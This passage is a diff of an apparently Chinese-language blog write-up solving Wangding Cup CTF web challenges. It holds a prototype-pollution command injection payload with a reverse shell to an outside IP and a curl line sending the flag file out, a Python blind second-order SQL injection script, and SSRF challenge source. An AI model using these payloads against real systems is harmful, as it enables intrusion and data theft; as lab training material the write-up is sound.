class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure>
 
 <p>那我们只要控制id为__ proto __即可污染。</p>
 <p>这里一开始传了参数发现会报错给我整不会了</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320173335763.png" alt="image-20240320173335763" class="lazyload"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320173335763.png" alt="image-20240320173335763"></p>
 <p>去看了wp说报错也不影响。</p>
 <p>那我就先试了一下污染成ls，但是没有回显</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=ls&amp;raw=hhh<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=ls&amp;raw=hhh<br></code></pre></td></tr></table></figure>
 
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320173550096.png" alt="image-20240320173550096" class="lazyload"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320173550096.png" alt="image-20240320173550096"></p>
 <p>然后用了一下curl是能监听到的，那就可以直接反弹shell了</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">id=__proto__&amp;author=bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&amp;raw=hhh<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">id=__proto__&amp;author=bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&amp;raw=hhh<br></code></pre></td></tr></table></figure>
 
 <blockquote>
 <p>难绷弹不回来不知道为什么，那就用curl吧。。。</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=curl &lt;主机ip&gt; -d `cat /flag`&amp;raw=hhh<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=curl &lt;主机ip&gt; -d `cat /flag`&amp;raw=hhh<br></code></pre></td></tr></table></figure>
 
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320174451680.png" alt="image-20240320174451680" class="lazyload"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320174451680.png" alt="image-20240320174451680"></p>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/135079967">https://blog.csdn.net/m0_73512445/article/details/135079967</a></p>
-<h1><span id="wang-ding-bei-2018-unfinish">[网鼎杯 2018]unfinish</span><a href="#wang-ding-bei-2018-unfinish" class="header-anchor">#</a></h1><p>这题的考点是二次注入，还不会二次注入先学习一下，参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jackie-lee/p/16124022.html">https://www.cnblogs.com/jackie-lee/p/16124022.html</a></p>
+<h1><span id="网鼎杯-2018unfinish">[网鼎杯 2018]unfinish</span></h1><p>这题的考点是二次注入，还不会二次注入先学习一下，参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jackie-lee/p/16124022.html">https://www.cnblogs.com/jackie-lee/p/16124022.html</a></p>
 <blockquote>
 <p>总结一下就是二次利用恶意数据，第一次发送的恶意数据经过转义后存入数据库，但之后从数据取出数据利用的时候并没有转义，那这个时候我们的恶意数据就会生效。</p>
 </blockquote>
 <p>进去就给了一个login.php，扫了一下发现还有register.php</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326000952219.png" alt="image-20240326000952219" class="lazyload"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326000952219.png" alt="image-20240326000952219"></p>
 <p>随便注册一个账号登录进去之后就是一张图片</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326001047845.png" alt="image-20240326001047845" class="lazyload"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326001047845.png" alt="image-20240326001047845"></p>
 <p>可以看到上图的左侧中会回显一个用户名，这就是第二次利用数据库中的数据，那应该就是在注册的用户名上动手脚了</p>
 <p>在注册页面的用户名输了一下逗号发现被过滤了</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326002729728.png" alt="image-20240326002729728" class="lazyload"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326002729728.png" alt="image-20240326002729728"></p>
 <p>那我们就先去爆破一下看看过滤了什么关键词</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326003157517.png" alt="image-20240326003157517" class="lazyload"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326003157517.png" alt="image-20240326003157517"></p>
 <p>看到似乎是只过滤了information和逗号</p>
-<p>参测一下sql语句如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select username from table where username = &#x27;传递的参数&#x27;<br></code></pre></td></tr></table></figure>
+<p>猜测一下sql语句如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select username from table where username = &#x27;传递的参数&#x27;<br></code></pre></td></tr></table></figure>
 
+<p>我们去注册一下用户名0’ and ‘1 看一下，可以发现用户名变成了0，即存在二次注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328145045188.png" alt="image-20240328145045188"></p>
+<p>这里可以了解一下MySQL中字符串的运算</p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328144630707.png" alt="image-20240328144630707"></p>
+<p>执行select ‘0’+database()变成了0：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328144719610.png" alt="image-20240328144719610"></p>
+<p>不过用下面的查询方式就能知道数据库名的第一个字符的ascii码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328144824861.png" alt="image-20240328144824861"></p>
+<p>题中过滤了逗号可以用下面的方式</p>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328144917362.png" alt="image-20240328144917362"></p>
+<p>然后我们就可以进行盲注，因为过滤了information，所以wp猜测表名为flag，只能说很猜谜。</p>
+<p>那脚本如下，因为邮箱不能重复注册，所以每次注册都要不一样（不想写了偷个懒）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    url = <span class="hljs-string">&#x27;&#x27;</span><br>    register_url = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>    login_url = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        register_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>                 <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        login_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        requests.post(register_url, data=register_data)<br>        response_login = requests.post(login_url, data=login_data)<br>        bs = BeautifulSoup(response_login.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>) <br>        username = bs.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)  <span class="hljs-comment"># 取返回页面数据的span class=user-name属性</span><br>        number = username.text  <br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(number))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\r&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(flag,end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_flag()<br></code></pre></td></tr></table></figure>
 
-	</article>
+<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328150712672.png" alt="image-20240328150712672"></p>
+<blockquote>
+<p>不过还是觉得很奇怪，按照上面的查询语句不应该是为空嘛查询出来的值？</p>
+<p>网上也没找到源码不清楚具体是怎么样的</p>
+</blockquote>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://juejin.cn/post/7158228802844229662#heading-1">https://juejin.cn/post/7158228802844229662#heading-1</a></p>
+<h1><span id="网鼎杯-2020-玄武组ssrfme">[网鼎杯 2020 玄武组]SSRFMe</span></h1><p>题目源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$match_result</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-variable">$url_parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$ip</span>=<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$hostname</span>);<br>    <span class="hljs-variable">$int_ip</span>=<span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_inner_ip</span>(<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$result_info</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>])<br>        &#123;<br>            <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$output</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">// Please visit hint.php locally.</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-	 
-    <div class="kira-post-copyright">
-        <strong>Author：</strong>clown<br>
-        <strong>Link：</strong><a href="https://clowsman.github.io/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/" title="https:&#x2F;&#x2F;clowsman.github.io&#x2F;2024&#x2F;03&#x2F;20&#x2F;Nssctf刷题-网鼎杯&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;clowsman.github.io&#x2F;2024&#x2F;03&#x2F;20&#x2F;Nssctf刷题-网鼎杯&#x2F;</a><br>
-        
-            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
-        
-    </div>
-
-  
-	<div class="kira-post-nav">
-		<nav class="post-nav">
-			      
-			<!-- 先找到与当前文字相同的目录 -->
-			            
-			<!-- 在找到当前文章所在的 index -->
-			            
-			<!-- 上一篇文章 -->
-			<div class="old">
-				<span>上一章</span>
-				<a href="/2024/03/11/ctfhub%E7%9A%84disable-function/"> ctfhub的disable_function</a>
-			</div>
-			                                                      
-		</nav>
-	</div>
-	
-	<div class="kira-post-meta kira-rainbow">
-		
-			<a class="kirafont icon-container-fill -link" href="/categories/web/">web</a>
-		
-		
-			<a class="kirafont icon-tag-fill -none-link" href="/tags/ctf-%E5%88%B7%E9%A2%98/" rel="tag">ctf 刷题</a>
-		
-	</div>
-	
-		<script src="/js/kira-code-copy.js"></script>
-	
-	
-	<div class="kira-post-footer">
-		
-
-		
-	<div class="giscus"></div>
-  
-    <script src="https://giscus.app/client.js"
-      data-repo="ch1ny/ch1ny.github.io"
-      data-repo-id="R_kgDOHGgizw"
-      data-category="General"
-      data-category-id="DIC_kwDOHGgiz84CU88t"
-      data-mapping="pathname"
-      data-strict="0"
-      data-reactions-enabled="1"
-      data-emit-metadata="0"
-      data-input-position="top"
-      data-theme="light"
-      data-lang="en"
-      data-loading="lazy"
-      crossorigin="anonymous"
-      async  
-    ></script>
-  
-
-	</div>
-	
-</div>
-
-				</div>
-			</div>
-			<div class="kira-right-column">
-	<a onclick="document.querySelector('#kira-top-header').scrollIntoView({behavior: 'smooth'});" class="kira-backtotop" aria-label="回到顶部" title="回到顶部">
-		<button class="mdui-fab mdui-ripple">
-			<i class="kirafont icon-caret-up"></i>
-		</button>
-	</a>
-</div>
-
-		</div>
-	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
-</html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://clowsman.github.io">clown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://clowsman.github.io/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/">https://clowsman.github.io/2024/03/20/Nssctf刷题-网鼎杯/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://clowsman.github.io" target="_blank">clown</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf-%E5%88%B7%E9%A2%98/">ctf 刷题</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154907.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" title="内网渗透体系建设-端口转发和代理"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154900.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">内网渗透体系建设-端口转发和代理</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网渗透体系建设-信息搜集"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">内网渗透体系建设-信息搜集</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/02/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/" title="buu做题记录1"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-02</div><div class="title">buu做题记录1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">clown</div><div class="author-info__description">又菜又爱玩</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/clowsman"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/clowsman" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">[网鼎杯 2020青龙组]Notes</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">[网鼎杯 2018]unfinish</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">[网鼎杯 2020 玄武组]SSRFMe</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/" title="流量分析学习"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="流量分析学习"/></a><div class="content"><a class="title" href="/2024/03/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/" title="流量分析学习">流量分析学习</a><time datetime="2024-03-29T02:41:50.000Z" title="发表于 2024-03-29 10:41:50">2024-03-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/28/msf%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/" title="msf基础使用学习"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329155057.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="msf基础使用学习"/></a><div class="content"><a class="title" href="/2024/03/28/msf%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/" title="msf基础使用学习">msf基础使用学习</a><time datetime="2024-03-28T15:38:32.000Z" title="发表于 2024-03-28 23:38:32">2024-03-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="内网渗透体系建设-权限提升"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154907.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透体系建设-权限提升"/></a><div class="content"><a class="title" href="/2024/03/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="内网渗透体系建设-权限提升">内网渗透体系建设-权限提升</a><time datetime="2024-03-26T01:01:50.000Z" title="发表于 2024-03-26 09:01:50">2024-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" title="内网渗透体系建设-端口转发和代理"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154900.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透体系建设-端口转发和代理"/></a><div class="content"><a class="title" href="/2024/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" title="内网渗透体系建设-端口转发和代理">内网渗透体系建设-端口转发和代理</a><time datetime="2024-03-24T17:07:12.000Z" title="发表于 2024-03-25 01:07:12">2024-03-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/" title="Nssctf刷题-网鼎杯"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154907.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nssctf刷题-网鼎杯"/></a><div class="content"><a class="title" href="/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/" title="Nssctf刷题-网鼎杯">Nssctf刷题-网鼎杯</a><time datetime="2024-03-20T08:35:09.000Z" title="发表于 